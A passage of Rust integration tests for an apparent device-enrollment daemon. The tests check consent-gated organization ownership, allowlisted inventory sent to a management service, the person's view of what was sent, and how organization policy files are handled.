        "current": "2026.08.27.1",
        "release_manifest": "releases/2026.08.27.1/release.json",
        "rollout_bps": 10000,
        "halted": false,
        "published_at": "2026-08-27T22:00:00Z",
        "min_supported_version": "2026.08.01.1"
    }))
    .unwrap();
    fs::write(
        repository.join("channel.json.sig"),
        signing.sign(&document).to_bytes(),
    )
    .unwrap();
    fs::write(repository.join("channel.json"), document).unwrap();
    cfg.update_check_sources = UpdateCheckSources {
        repository_url_file: dir.join("update-repository.url"),
        repository_url_owner_uid: rustix::process::geteuid().as_raw(),
        repository_dir: repository,
        curl_bin: dir.join("curl"),
        trusted_keys_dir: keys,
        cached_channel: cfg.state_dir.join("update/verified-channel.json"),
        cached_signature: cfg.state_dir.join("update/verified-channel.json.sig"),
        os_release,
        pi_boot_partition: dir.join("pi-partition"),
        cache_max_age_seconds: 900,
        architecture_override: Some(Architecture::Aarch64),
        boot_platform_override: Some(BootPlatform::Uefi),
    };
}

/// Looking for updates is something a person does, not something the device
/// is. A verified check that finds a newer release changes what they know
/// and leaves the device's patch state as it was, so it changes nothing the
/// organization receives: no verdict appears, and no inventory is sent off
/// its schedule to announce one. Otherwise the organization would learn the
/// moment the person looked.
#[test]
fn a_persons_update_check_tells_the_organization_nothing() {
    let dir = test_dir("update-check-quiet");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start_with(
        &dir,
        Peer::root(),
        &control_plane.socket,
        "enabled",
        Vec::new(),
        |cfg| configure_update_channel(cfg, &dir),
    );
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(control_plane.state.inventory.lock().unwrap().len(), 1);

    let check = daemon.result("update.check", Some(json!({"force": true})));
    assert_eq!(check["available"], "2026.08.27.1", "{check}");
    assert!(daemon.state_path("update/verified-channel.json").is_file());
    daemon.result("reconcile", None);
    daemon.result("reconcile", None);

    let inventory = control_plane.state.inventory.lock().unwrap();
    assert_eq!(inventory.len(), 1, "the check sent nothing: {inventory:?}");
    assert_eq!(
        inventory[0]["inventory"]["posture"]["os_patch_status"],
        "unknown"
    );
}

/// The organization-owned tier through the whole daemon: the same device
/// enrolled personally, then by an organization that claims it and a person
/// who accepted that. Ownership adds the serial number and the system-wide
/// applications, and nothing else.
#[test]
fn an_organization_owned_enrollment_adds_the_serial_and_system_apps() {
    let dir = test_dir("org-owned");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(
        read_json(&daemon.state_path("enrollment.json"))["organization_owned"],
        false
    );
    assert!(
        !dir.join("machine/flatpak-argv").exists(),
        "a personal enrollment never lists the installation"
    );
    daemon.result("enroll.stop", None);

    *control_plane.state.org_ownership.lock().unwrap() = Some(json!("organization"));
    let enrolled = daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
    );
    assert_eq!(enrolled["organization_owned"], true);
    assert_eq!(enrolled["removable"], true, "the terms are independent");
    assert_eq!(
        daemon.result("enroll.status", None)["organization_owned"],
        true
    );
    assert_eq!(
        read_json(&daemon.state_path("enrollment.json"))["organization_owned"],
        true
    );
    let inventory = control_plane.state.inventory.lock().unwrap();
    assert_eq!(inventory.len(), 2);
    let personal = &inventory[0]["inventory"];
    let owned = &inventory[1]["inventory"];
    assert_personal_inventory(personal);
    assert_eq!(
        sorted_keys(owned),
        [
            "applications",
            "capabilities",
            "hardware",
            "identifiers",
            "kernel",
            "os",
            "posture"
        ]
    );
    assert_eq!(
        owned["identifiers"],
        json!({ "serial_number": FIXTURE_SERIAL })
    );
    for section in ["os", "posture", "hardware", "capabilities"] {
        assert_eq!(owned[section], personal[section], "{section}");
    }
    let rows: Vec<(&str, &str)> = owned["applications"]
        .as_array()
        .unwrap()
        .iter()
        .map(|app| {
            (
                app["name"].as_str().unwrap(),
                app["source"].as_str().unwrap(),
            )
        })
        .collect();
    assert_eq!(
        rows,
        [
            ("chromium", "punar-image"),
            ("org.mozilla.firefox", "flatpak"),
            ("org.punar.Mail", "punar-image"),
        ]
    );
    assert_eq!(
        fs::read_to_string(dir.join("machine/flatpak-argv")).unwrap(),
        "list --system --app --columns=application,name,version,active\n",
        "the system installation only, fixed argv"
    );
}

/// An organization can claim the device as its own, but only its user can
/// make that claim count: without the person's yes the enrollment is refused
/// after discovery and before register, so the organization never hears of
/// the device and nothing about it is sent. The refusal says what the
/// organization would receive, and which flag accepts it.
#[test]
fn an_organization_owned_enrollment_needs_the_persons_yes_before_register() {
    let dir = test_dir("owned-consent");
    let state = Arc::new(ControlPlaneState::default());
    *state.org_ownership.lock().unwrap() = Some(json!("organization"));
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, person(), &control_plane.socket, "disabled");

    let ticket = mint_ticket(&dir, 1000, TICKET);
    let error = daemon.error(
        "enroll.start",
        Some(json!({
            "org_domain": "acme.com",
            "code": "lex_owned",
            "ticket": TICKET,
            // Accepting a term the organization did not set accepts nothing.
            "accept_non_removable": true
        })),
    );
    assert_eq!(error["code"], "denied", "{error}");
    assert_eq!(
        error["details"]["reason"],
        "organization_owned_not_accepted"
    );
    assert_eq!(error["details"]["terms"], json!(["organization_owned"]));
    assert_eq!(error["details"]["organization_name"], "Acme Engineering");
    let message = error["message"].as_str().unwrap();
    assert!(
        message.contains("--accept-organization-owned`"),
        "{message}"
    );
    assert!(!message.contains("--accept-non-removable"), "{message}");
    assert!(message.contains("serial number"), "{message}");
    assert!(
        message.contains("every app installed for all users"),
        "{message}"
    );
    assert_no_root_advice(message);
    assert!(!ticket.exists(), "the confirmation paid for discovery");
    assert_eq!(*state.methods.lock().unwrap(), vec!["org.discover"]);
    assert!(
        state
            .lines
            .lock()
            .unwrap()
            .iter()
            .all(|l| !l.contains("lex_owned")),
        "the code never left the device"
    );
    assert!(state.inventory.lock().unwrap().is_empty());
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
    assert!(!daemon.state_path("enrollment.json").exists());
    assert!(!dir.join("machine/flatpak-argv").exists());
    assert_eq!(
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == "enroll.start" && e["decision"] == "deny")
            .count(),
        1,
        "the refusal is audited"
    );

    mint_ticket(&dir, 1000, TICKET);
    let enrolled = daemon.result(
        "enroll.start",
        Some(json!({
            "org_domain": "acme.com",
            "ticket": TICKET,
            "accept_organization_owned": true
        })),
    );
    assert_eq!(enrolled["organization_owned"], true);
    assert_eq!(enrolled["removable"], true);
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["organization_owned"], true);
    // Owned, but still the person's to unenroll: the terms are separate.
    assert_eq!(status["removable"], true);
    let inventory = state.inventory.lock().unwrap();
    assert_eq!(inventory.len(), 1);
    assert_eq!(
        inventory[0]["inventory"]["identifiers"]["serial_number"],
        FIXTURE_SERIAL
    );
}

/// `personal`, or no ownership at all, asks nothing more and sends the
/// personal tier: no identifiers, only the image's own applications.
#[test]
fn a_personal_ownership_term_asks_nothing_and_sends_no_identifiers() {
    let dir = test_dir("owned-personal");
    let state = Arc::new(ControlPlaneState::default());
    *state.org_ownership.lock().unwrap() = Some(json!("personal"));
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let enrolled = daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(enrolled["organization_owned"], false);
    assert_eq!(
        daemon.result("enroll.status", None)["organization_owned"],
        false
    );
    let inventory = state.inventory.lock().unwrap();
    assert_eq!(inventory.len(), 1);
    assert_personal_inventory(&inventory[0]["inventory"]);
    assert!(!dir.join("machine/flatpak-argv").exists());
}

/// An organization that tried to state an ownership this device cannot read
/// gets a refusal before register, never either reading of its document.
#[test]
fn an_unreadable_ownership_term_refuses_enrollment_before_register() {
    let dir = test_dir("owned-bad");
    let state = Arc::new(ControlPlaneState::default());
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
    for ownership in [
        json!("Organization"),
        json!("corporate"),
        json!(""),
        json!(true),
        json!(null),
        json!({"type": "organization"}),
    ] {
        state.methods.lock().unwrap().clear();
        *state.org_ownership.lock().unwrap() = Some(ownership.clone());
        let error = daemon.error(
            "enroll.start",
            Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
        );
        assert_eq!(error["code"], "invalid_params", "{ownership}: {error}");
        assert_eq!(error["details"]["reason"], "enrollment.ownership");
        assert_no_root_advice(error["message"].as_str().unwrap());
        assert_eq!(*state.methods.lock().unwrap(), vec!["org.discover"]);
    }
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
    assert!(!daemon.state_path("enrollment.json").exists());
    assert!(state.inventory.lock().unwrap().is_empty());
}

/// An organization that sets both terms is refused once, naming both, with
/// both meanings and both flags, so a person is asked once rather than once
/// per term. Each flag accepts only its own term: a request that accepts one
/// is refused for the other, the non-removable refusal exactly as it reads
/// when it is the only term. Nothing reaches the control plane until both
/// are accepted.
#[test]
fn both_enrollment_terms_are_named_in_one_refusal_and_accepted_together() {
    let dir = test_dir("two-terms");
    let state = Arc::new(ControlPlaneState::default());
    *state.org_removable.lock().unwrap() = Some(json!(false));
    *state.org_ownership.lock().unwrap() = Some(json!("organization"));
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");

    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["code"], "denied", "{error}");
    assert_eq!(error["details"]["reason"], "enrollment_terms_not_accepted");
    assert_eq!(
        error["details"]["terms"],
        json!(["non_removable", "organization_owned"])
    );
    assert_eq!(error["details"]["organization"], "acme");
    let message = error["message"].as_str().unwrap();
    assert!(
        message.contains(
            "`punarctl enroll start acme.com --accept-non-removable --accept-organization-owned`"
        ),
        "{message}"
    );
    assert!(
        message.contains("nobody on it, you included, can unenroll it"),
        "{message}"
    );
    assert!(message.contains("serial number"), "{message}");
    assert!(
        message.contains("every app installed for all users"),
        "{message}"
    );
    assert_no_root_advice(message);

    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "accept_non_removable": true})),
    );
    assert_eq!(
        error["details"]["reason"],
        "organization_owned_not_accepted"
    );
    assert_eq!(error["details"]["terms"], json!(["organization_owned"]));

    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
    );
    assert_eq!(error["details"]["reason"], "non_removable_not_accepted");
    assert_eq!(error["details"]["terms"], json!(["non_removable"]));
    assert!(
        error["message"].as_str().unwrap().starts_with(
            "\"Acme Engineering\" enrolls devices so that nobody on them can unenroll them"
        ),
        "{error}"
    );
    assert_eq!(
        *state.methods.lock().unwrap(),
        vec!["org.discover", "org.discover", "org.discover"],
        "nothing but discovery until every term is accepted"
    );
    assert!(!daemon.state_path("enrollment.json").exists());

    let enrolled = daemon.result(
        "enroll.start",
        Some(json!({
            "org_domain": "acme.com",
            "accept_non_removable": true,
            "accept_organization_owned": true
        })),
    );
    assert_eq!(enrolled["removable"], false);
    assert_eq!(enrolled["organization_owned"], true);
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["removable"], false);
    assert_eq!(status["organization_owned"], true);
    let inventory = state.inventory.lock().unwrap();
    assert_eq!(
        inventory[0]["inventory"]["identifiers"]["serial_number"],
        FIXTURE_SERIAL
    );
}

/// A row the receiver could not store would discard its whole snapshot, so
/// the list goes out as `null` instead of without the row — and the audit
/// says so once when that starts and once when a full list is back, never
/// once per pass.
#[test]
fn a_withheld_application_list_is_null_and_audited_on_transitions_only() {
    let dir = test_dir("withheld");
    let control_plane = ControlPlane::start(&dir);
    *control_plane.state.org_ownership.lock().unwrap() = Some(json!("organization"));
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
    );
    let events = |daemon: &TestDaemon, result: &str| {
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == "enroll.inventory" && e["result"] == result)
            .count()
    };
    assert_eq!(events(&daemon, "applications_withheld"), 0);

    // The installation changes and now lists a row with no columns.
    let flatpak = dir.join("machine/bin/flatpak");
    let changed = dir.join("machine/var/lib/flatpak/.changed");
    let good_script = fs::read_to_string(&flatpak).unwrap();
    fs::write(&flatpak, "#!/bin/sh\nprintf 'not-a-flatpak-row\\n'\n").unwrap();
    fs::write(&changed, "1").unwrap();
    daemon.result("reconcile", None);
    daemon.result("reconcile", None);
    {
        let inventory = control_plane.state.inventory.lock().unwrap();
        let last = &inventory.last().unwrap()["inventory"];
        assert_eq!(last["applications"], Value::Null, "never a truncated list");
        assert_eq!(last["identifiers"]["serial_number"], FIXTURE_SERIAL);
    }
    assert_eq!(
        events(&daemon, "applications_withheld"),
        1,
        "once, not per pass"
    );
    assert_eq!(events(&daemon, "success"), 0);

    // Repaired: the full list goes out again, and that is audited once.
    fs::write(&flatpak, good_script).unwrap();
    fs::write(&changed, "22").unwrap();
    daemon.result("reconcile", None);
    daemon.result("reconcile", None);
    {
        let inventory = control_plane.state.inventory.lock().unwrap();
        let last = &inventory.last().unwrap()["inventory"];
        assert_eq!(last["applications"].as_array().unwrap().len(), 3);
    }
    assert_eq!(events(&daemon, "applications_withheld"), 1);
    assert_eq!(events(&daemon, "success"), 1);
}

// ---------------------------------------------------------------------------
// What Smplify receives, and what the person is shown of it
// ---------------------------------------------------------------------------

/// The non-null keys of one section: what a field-name summary must list.
fn carried_keys(section: &Value) -> Vec<String> {
    let mut keys: Vec<String> = section
        .as_object()
        .unwrap()
        .iter()
        .filter(|(_, value)| match value {
            Value::Null => false,
            Value::Array(rows) => !rows.is_empty(),
            Value::String(text) => !text.is_empty(),
            _ => true,
        })
        .map(|(key, _)| key.clone())
        .collect();
    keys.sort();
    keys
}

/// `aa:bb:cc:dd:ee:ff`, or four dot-separated numbers of at most three
/// digits: the shape an address would have if one leaked.
fn carries_an_address(text: &str) -> bool {
    text.split(|c: char| !(c.is_ascii_hexdigit() || c == ':' || c == '.'))
        .any(|token| {
            let mac: Vec<&str> = token.split(':').collect();
            let ip: Vec<&str> = token.split('.').collect();
            (mac.len() == 6 && mac.iter().all(|part| part.len() == 2))
                || (ip.len() == 4
                    && ip.iter().all(|part| {
                        (1..=3).contains(&part.len()) && part.bytes().all(|b| b.is_ascii_digit())
                    }))
        })
}

const SMPLIFY_HARDWARE_KEYS: [&str; 17] = [
    "batteryPresent",
    "biosVersion",
    "cpuCores",
    "cpuModel",
    "cpuThreads",
    "cpuVendor",
    "deviceCapacityBytes",
    "isVirtual",
    "manufacturer",
    "memoryTotalBytes",
    "modelName",
    "rootFilesystemType",
    "secureBoot",
    "tpmPresent",
    "tpmVersion",
    "uefi",
    "virtualization",
];

/// The whole path, punard to Smplify: punard's real inventory through the
/// agent's real translation (`punar_smplifyd::status`), checked as exact
/// key sets per tier where Smplify would receive it. Then the person's side
/// of the same send: `organization-view.json` holds exactly the body that
/// left, and `enroll.status` names exactly its non-null fields.
#[test]
fn smplify_receives_exactly_the_allowlist_per_tier_and_the_person_is_shown_it() {
    let dir = test_dir("smplify-path");
    let state = Arc::new(ControlPlaneState::default());
    state.translate_like_smplifyd.store(true, Ordering::SeqCst);
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));

    let personal = state.status_bodies.lock().unwrap()[0].clone();
    assert_eq!(
        sorted_keys(&personal),
        [
            "deviceId",
            "facts",
            "heartbeat",
            "supportedActions",
            "systemInfo"
        ]
    );
    let info = &personal["systemInfo"];
    assert_eq!(
        sorted_keys(info),
        ["hardware", "os", "security", "software"],
        "never network, never identity"
    );
    assert_eq!(
        sorted_keys(&info["os"]),
        ["arch", "kernelRelease", "name", "version"]
    );
    assert_eq!(
        sorted_keys(&info["hardware"]),
        SMPLIFY_HARDWARE_KEYS,
        "no serial number on a personal enrollment"
    );
    assert_eq!(
        sorted_keys(&info["security"]),
        [
            "diskEncryptionEnabled",
            "firewall",
            "firewallEnabled",
            "osPatchStatus",
            "rebootRequired"
        ]
    );
    assert_eq!(
        sorted_keys(&info["software"]),
        [
            "installedPackages",
            "installedPackagesCount",
            "installedPackagesHash",
            "smplifydBuildDate",
            "smplifydRevision",
            "smplifydVersion"
        ]
    );
    assert_eq!(personal["supportedActions"], json!([]));
    assert_eq!(personal["facts"], json!({}));

    // The fixture machine, typed as Smplify reads it.
    assert_eq!(info["os"]["name"], "Punar OS 0.5 (M5)");
    assert_eq!(info["os"]["version"], "0.5");
    assert_eq!(info["os"]["kernelRelease"], "6.12.0-punar");
    assert!(matches!(
        info["os"]["arch"].as_str(),
        Some("x86_64" | "aarch64")
    ));
    let hardware = &info["hardware"];
    assert_eq!(hardware["manufacturer"], "QEMU");
    assert_eq!(hardware["modelName"], "Standard PC (Q35 + ICH9, 2009)");
    assert_eq!(hardware["cpuCores"], json!(4));
    assert_eq!(hardware["memoryTotalBytes"], json!(8_192_000u64 * 1024));
    assert_eq!(hardware["secureBoot"], json!(false));
    assert_eq!(hardware["uefi"], json!(true));
    assert_eq!(hardware["tpmPresent"], json!(true));
    assert_eq!(hardware["tpmVersion"], "2.0");
    assert_eq!(hardware["isVirtual"], json!(true));
    assert_eq!(hardware["batteryPresent"], json!(false));
    let security = &info["security"];
    assert_eq!(security["diskEncryptionEnabled"], json!(true));
    assert_eq!(security["firewallEnabled"], json!(true));
    assert_eq!(security["firewall"], "nftables");
    assert_eq!(security["osPatchStatus"], "unknown");
    assert_eq!(security["rebootRequired"], json!(false));
    assert_eq!(
        info["software"]["installedPackages"],
        json!([
            {"name": "chromium", "displayName": "Chromium",
             "version": "151.0.7922.173-1", "source": "punar-image", "managed": false},
            {"name": "org.punar.Mail", "displayName": "Mail", "version": null,
             "source": "punar-image", "managed": false},
        ])
    );
    assert_eq!(info["software"]["installedPackagesCount"], 2);
    let text = personal.to_string();
    for forbidden in [
        FIXTURE_SERIAL,
        "firefox",
        "Thunar",
        "/home",
        "hostname",
        "current_state",
        "capabilities",
        "timezone",
        "machineId",
    ] {
        assert!(!text.contains(forbidden), "Smplify received {forbidden}");
    }
    assert!(!carries_an_address(&text), "{text}");

    // The person's record is the body that left, byte for byte, and the
    // summary names exactly its non-null fields — never a field that did not
    // travel.
    let view_path = daemon.state_path("organization-view.json");
    assert_eq!(mode_of(&view_path), 0o640);
    let record = read_json(&view_path);
    assert_eq!(
        sorted_keys(&record),
        ["enrolled_at", "org_id", "sent", "sent_at", "version"],
        "bookkeeping around the body, nothing else"
    );
    assert_eq!(record["sent"], personal);
    let status = daemon.result("enroll.status", None);
    let view = &status["organization_view"];
    assert_eq!(view["sent_at"], record["sent_at"]);
    let categories: Vec<&str> = view["categories"]
        .as_array()
        .unwrap()
        .iter()
        .map(|category| category["category"].as_str().unwrap())
        .collect();
    assert_eq!(
        categories,
        ["hardware", "os", "security", "software"],
        "the empty supportedActions and facts told the organization nothing"
    );
    for category in view["categories"].as_array().unwrap() {
        let name = category["category"].as_str().unwrap();
        let fields: Vec<String> = serde_json::from_value(category["fields"].clone()).unwrap();
        assert_eq!(fields, carried_keys(&info[name]), "{name}");
    }
    assert_eq!(
        view["categories"][3]["counts"],
        json!({"installedPackages": 2})
    );
    assert!(!view.to_string().contains("serialNumber"));

    // The same device, enrolled again by an organization that owns it: the
    // serial number and the system-wide applications, and nothing else.
    daemon.result("enroll.stop", None);
    assert!(!view_path.exists());
    *state.org_ownership.lock().unwrap() = Some(json!("organization"));
    daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
    );
    let owned = state.status_bodies.lock().unwrap()[1].clone();
    assert_eq!(sorted_keys(&owned), sorted_keys(&personal));
    assert_eq!(sorted_keys(&owned["systemInfo"]), sorted_keys(info));
    let mut owned_hardware = SMPLIFY_HARDWARE_KEYS.to_vec();
    owned_hardware.push("serialNumber");
    owned_hardware.sort_unstable();
    assert_eq!(
        sorted_keys(&owned["systemInfo"]["hardware"]),
        owned_hardware
    );
    assert_eq!(
        owned["systemInfo"]["hardware"]["serialNumber"],
        FIXTURE_SERIAL
    );
    for section in ["os", "security"] {
        assert_eq!(owned["systemInfo"][section], info[section], "{section}");
    }
    let rows: Vec<(&str, &str)> = owned["systemInfo"]["software"]["installedPackages"]
        .as_array()
        .unwrap()
        .iter()
        .map(|row| {
            (
                row["name"].as_str().unwrap(),
                row["source"].as_str().unwrap(),
            )
        })
        .collect();
    assert_eq!(
        rows,
        [
            ("chromium", "punar-image"),
            ("org.mozilla.firefox", "flatpak"),
            ("org.punar.Mail", "punar-image"),
        ]
    );
    let record = read_json(&view_path);
    assert_eq!(record["sent"], owned);
    let status = daemon.result("enroll.status", None);
    let hardware_fields = status["organization_view"]["categories"][0].clone();
    assert_eq!(hardware_fields["category"], "hardware");
    assert!(
        hardware_fields["fields"]
            .as_array()
            .unwrap()
            .contains(&json!("serialNumber")),
        "{hardware_fields}"
    );
    let text = owned.to_string();
    for forbidden in ["hostname", "current_state", "/home", "Thunar"] {
        assert!(!text.contains(forbidden), "Smplify received {forbidden}");
    }
    assert!(!carries_an_address(&text), "{text}");
}

/// From a control plane that does not say what it sent on (the development
/// mock), the record is the inventory it received. It moves only when a send
/// succeeds, and a record that is missing or belongs to another enrollment
/// is reported as nothing sent rather than shown.
#[test]
fn the_organization_view_changes_only_when_a_send_succeeds() {
    const LONG_AGO: &str = "2026-01-01T00:00:00Z";
    let dir = test_dir("org-view");
    let enrollment_file = dir.join("state/enrollment.json");
    let view_path = dir.join("state/organization-view.json");
    let control_plane = ControlPlane::start(&dir);
    {
        let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
        daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
        let received = control_plane.state.inventory.lock().unwrap()[0]["inventory"].clone();
        assert_eq!(read_json(&view_path)["sent"], received);
        let view = daemon.result("enroll.status", None)["organization_view"].clone();
        let categories: Vec<(String, Vec<String>)> = view["categories"]
            .as_array()
            .unwrap()
            .iter()
            .map(|category| {
                (
                    category["category"].as_str().unwrap().to_string(),
                    serde_json::from_value(category["fields"].clone()).unwrap(),
                )
            })
            .collect();
        // The mock keeps punard's own inventory, and the person is told
        // what is in it: which capabilities exist, never a hostname or a
        // capability's value, because the body carries none.
        assert_eq!(categories[0].0, "device");
        assert_eq!(categories[0].1, ["applications", "capabilities", "kernel"]);
        assert_eq!(
            view["categories"][0]["counts"],
            json!({"applications": 2, "capabilities": 1})
        );
        let names: Vec<&str> = categories.iter().map(|(name, _)| name.as_str()).collect();
        assert_eq!(names, ["device", "hardware", "os", "posture"]);
        daemon.stop();
    }
    let recorded = fs::read(&view_path).unwrap();

    // Due again, with the control plane down: the send fails, and the record
    // of what the organization has is untouched.
    let mut enrollment = read_json(&enrollment_file);
    enrollment["last_inventory_sent_at"] = json!(LONG_AGO);
    fs::write(&enrollment_file, enrollment.to_string()).unwrap();
    let state = control_plane.stop();
    {
        let daemon = TestDaemon::start(
            &dir,
            Peer::root(),
            &dir.join("control-plane.sock"),
            "enabled",
        );
        daemon.stop();
    }
    assert_eq!(fs::read(&view_path).unwrap(), recorded);

    // Back online, the resend succeeds and the record moves with it. (Dated
    // back first, so the move shows even within the same second.)
    let mut dated = read_json(&view_path);
    dated["sent_at"] = json!(LONG_AGO);
    fs::write(&view_path, dated.to_string()).unwrap();
    let control_plane = ControlPlane::start_with(&dir, state);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    assert_eq!(control_plane.state.inventory.lock().unwrap().len(), 2);
    let record = read_json(&view_path);
    assert_ne!(record["sent_at"], LONG_AGO);
    assert_eq!(
        record["sent_at"],
        read_json(&enrollment_file)["last_inventory_sent_at"]
    );
    assert_eq!(
        record["sent"],
        control_plane.state.inventory.lock().unwrap()[1]["inventory"]
    );

    // A record of another enrollment is not this one's.
    let mut stale = record.clone();
    stale["enrolled_at"] = json!("2020-01-01T00:00:00Z");
    fs::write(&view_path, stale.to_string()).unwrap();
    assert_eq!(
        daemon.result("enroll.status", None)["organization_view"],
        json!({"sent_at": null, "categories": []})
    );
    fs::remove_file(&view_path).unwrap();
    assert_eq!(
        daemon.result("enroll.status", None)["organization_view"],
        json!({"sent_at": null, "categories": []})
    );
}

// ---------------------------------------------------------------------------
// The organization's policy set: the checks enroll.start shares with refresh
// ---------------------------------------------------------------------------

/// Enroll against `control_plane` and return the daemon.
fn enrolled(dir: &Path, control_plane: &ControlPlane, firewall_state: &str) -> TestDaemon {
    let daemon = TestDaemon::start(dir, Peer::root(), &control_plane.socket, firewall_state);
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    daemon
}

/// An organization publishes only organization layers, and a set is checked
/// as a whole: a layer claiming the OS's hard-safety rung, by kind or by
/// rank, and two envelopes with one id are each refused by name before
/// anything is written, and the identity register issued is released.
#[test]
fn enrollment_refuses_a_set_no_organization_may_publish() {
    let dir = test_dir("org-kinds");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let refused = |reason: &str| {
        let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
        assert_eq!(error["code"], "invalid_params", "{error}");
        assert_eq!(error["details"]["reason"], reason, "{error}");
        assert!(policy_d_files(&daemon).is_empty());
        assert!(!daemon.state_path("enrollment.json").exists());
        assert!(!daemon.state_path(".policy.d.next").exists());
        assert!(
            state.devices.lock().unwrap().is_empty(),
            "identity released"
        );
        error
    };

    *state.extra_envelopes.lock().unwrap() = vec![json!({
        "policy_id": "acme-safety",
        "source_kind": "os_hard_safety_constraint",
        "precedence_rank": 1
    })];
    let error = refused("source_kind_not_organizational");
    assert!(
        error["message"]
            .as_str()
            .unwrap()
            .contains("not one an organization may publish"),
        "{error}"
    );
    *state.extra_envelopes.lock().unwrap() = vec![json!({
        "policy_id": "acme-override",
        "source_kind": "device_specific_override",
        "precedence_rank": 1
    })];
    refused("rank_not_organizational");
    state.extra_envelopes.lock().unwrap().clear();
    state.serve_duplicate_ids.store(true, Ordering::SeqCst);
    refused("duplicate_policy_id");

    state.serve_duplicate_ids.store(false, Ordering::SeqCst);
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(policy_d_files(&daemon), ["eng-baseline-v12.json"]);
}

/// What a root administrator dropped into policy.d stays: enrolling carries
/// it into the new directory as the same file, keeps its layer in force (the
/// daemon enforces what its next start would load, not the organization's
/// files alone), and refuses a set that would take one over.
#[test]
fn enrollment_keeps_a_root_drop_and_refuses_to_take_one_over() {
    let dir = test_dir("root-drop");
    let policy_d = dir.join("state/policy.d");
    write_file(
        &policy_d.join("local-lab.json"),
        json!({
            "policy_id": "local-lab",
            "source_kind": "organization_role_policy",
            "precedence_rank": 3,
            "policy": {"spec": {"security": {"localAdmin": {"policyEditing": "denied"}}}}
        })
        .to_string(),
    );
    write_file(&policy_d.join("local-lab.yaml"), "kind: note\n");
    let inode = |name: &str| {
        use std::os::unix::fs::MetadataExt;
        fs::metadata(policy_d.join(name)).unwrap().ino()
    };
    let before = (inode("local-lab.json"), inode("local-lab.yaml"));
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");

    let mut files = policy_d_files(&daemon);
    files.sort();
    assert_eq!(
        files,
        ["eng-baseline-v12.json", "local-lab.json", "local-lab.yaml"]
    );
    assert_eq!(
        (inode("local-lab.json"), inode("local-lab.yaml")),
        before,
        "carried over, not copied"
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(
        status["policy_ids"],
        json!(["eng-baseline-v12"]),
        "not owned"
    );
    let effective = daemon.result("policy.effective", None);
    assert_eq!(effective["local_admin"]["allowed"], false, "{effective}");
    assert_eq!(effective["local_admin"]["source"]["policy_id"], "local-lab");

    // Unenrolling removes the organization's files and nothing else.
    daemon.result("enroll.stop", None);
    let mut files = policy_d_files(&daemon);
    files.sort();
    assert_eq!(files, ["local-lab.json", "local-lab.yaml"]);

    // A set naming a root drop is refused, and the drop is untouched.
    let squatted = fs::read(policy_d.join("local-lab.json")).unwrap();
    *control_plane.state.extra_envelopes.lock().unwrap() = vec![role_envelope("local-lab")];
    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(
        error["details"]["reason"], "foreign_file_collision",
        "{error}"
    );
    let message = error["message"].as_str().unwrap();
    assert!(message.contains("policy.d/local-lab.json"), "{error}");
    assert!(message.contains("remove it and enroll again"), "{error}");
    assert_eq!(fs::read(policy_d.join("local-lab.json")).unwrap(), squatted);
    assert!(!daemon.state_path("enrollment.json").exists());
}

/// A refresh records the files of both sets before it swaps policy.d, so a
/// crash never leaves a file no record owns. At the next start the staging
/// directory it left is removed, and the record owns exactly the files
/// policy.d holds, which is what enroll.status names and unenroll removes.
#[test]
fn an_interrupted_policy_change_settles_at_startup() {
    let dir = test_dir("settle");
    let control_plane = ControlPlane::start(&dir);
    enrolled(&dir, &control_plane, "enabled").stop();

    let record_path = dir.join("state/enrollment.json");
    let mut record = read_json(&record_path);
    record["policy_files"] = json!(["eng-baseline-v12.json", "eng-role-sre.json"]);
    fs::write(&record_path, record.to_string()).unwrap();
    write_file(&dir.join("state/.policy.d.next/eng-role-sre.json"), "{}");
    write_file(&dir.join("state/.policy.d.enroll-staging/x.json"), "{}");

